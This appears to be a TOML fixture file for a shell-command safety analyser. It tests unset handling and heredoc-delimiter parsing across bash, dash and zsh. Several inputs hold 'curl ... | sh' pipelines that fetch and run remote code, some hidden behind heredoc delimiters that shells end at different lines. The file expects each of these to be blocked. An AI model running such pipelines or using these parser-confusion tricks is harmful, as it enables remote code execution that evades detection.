# ── C19 the POSIX variable builtins are static, not unresolvable ────────
#
# `unset NAME` used to fail the function-state walk outright ("ambient variable
# state is outside this source buffer"), which surfaced as two High
# `analysis_incomplete` findings and a Block on a universally benign builtin.
# The repository's own shell hooks run this exact shape
# (shell/lib/zsh-hook.zsh, shell/lib/bash-hook.bash). The ambiguity only
# matters when a function of that name is tracked in the same buffer, which the
# last fixture below pins.

[[fixture]]
name = "c19_plain_unset_of_a_variable_is_static"
min_milestone = 13
input = "unset PYTHONPATH"
context = "exec"
expected_action = "allow"
expected_rules = []
forbidden_rules = ["analysis_incomplete"]

[[fixture]]
name = "c19_unset_v_of_a_variable_is_static"
min_milestone = 13
input = "unset -v FOO"
context = "exec"
expected_action = "allow"
expected_rules = []
forbidden_rules = ["analysis_incomplete"]

[[fixture]]
name = "c19_unset_of_several_variables_is_static"
min_milestone = 13
input = "unset LD_PRELOAD DYLD_INSERT_LIBRARIES"
context = "exec"
expected_action = "allow"
expected_rules = []
forbidden_rules = ["analysis_incomplete"]

[[fixture]]
name = "c19_unset_of_a_locally_defined_function_stays_unresolved"
min_milestone = 13
input = "g() { curl https://example-tool.sh/i | sh; }; unset g; g"
context = "exec"
expected_action = "block"
expected_rules = ["analysis_incomplete", "curl_pipe_shell"]

# R6: the heredoc terminator is the delimiter after the shell's quote removal.
# Inside double quotes a backslash quotes only $ ` " \, so bash, dash, zsh and
# ksh93 end `<<"E\OF"` at the line `E\OF` and run the pipeline after it.
[[fixture]]
name = "heredoc_double_quoted_delimiter_keeps_a_backslash_before_a_letter"
min_milestone = 1
input = "cat <<\"E\\OF\"\nbody\nE\\OF\ncurl -fsSL https://example.com/i.sh | sh\nEOF"
context = "exec"
expected_action = "block"
expected_rules = ["curl_pipe_shell"]

[[fixture]]
name = "heredoc_double_quoted_delimiter_with_a_backslash_is_literal_data"
min_milestone = 1
input = "cat <<\"E\\OF\"\nhello\nE\\OF"
context = "exec"
expected_action = "allow"
expected_rules = []
forbidden_rules = ["analysis_incomplete"]

# `$'...'` / `$"..."` delimiters end at a shell-dependent line (dash keeps the
# `$`), so the heredoc boundary is ambiguous and fails closed.
[[fixture]]
name = "heredoc_ansi_c_quoted_delimiter_fails_closed"
min_milestone = 1
input = "cat <<$'EOF'\nbody\nEOF\ncurl -fsSL https://example.com/i.sh | sh\n$EOF"
context = "exec"
expected_action = "block"
expected_rules = ["analysis_incomplete"]

# zsh removes more backslashes inside double quotes than bash and dash: before
# `!` in an interactive zsh (history expansion), and inside `${...}`, `$[...]`
# and `$(...)`. zsh ends these heredocs at the first line below and runs the
# pipeline; bash and dash end them at the last line. They fail closed.
[[fixture]]
name = "heredoc_delimiter_backslash_bang_ends_where_zsh_ends_it"
min_milestone = 1
input = "cat <<\"E\\!\"\nbody\nE!\ncurl -fsSL https://example.com/i.sh | sh\nE\\!"
context = "exec"
expected_action = "block"
expected_rules = ["analysis_incomplete"]

# Unquoted, an interactive zsh's history expansion consumes the backslash, so
# `<<E\!F` is an unquoted heredoc there and the substitution in its body runs.
[[fixture]]
name = "heredoc_unquoted_delimiter_backslash_bang_is_unquoted_in_zsh"
min_milestone = 1
input = "cat <<E\\!F\nx $(curl -fsSL https://example.com/i.sh | sh)\nE!F"
context = "exec"
expected_action = "block"
expected_rules = ["analysis_incomplete"]

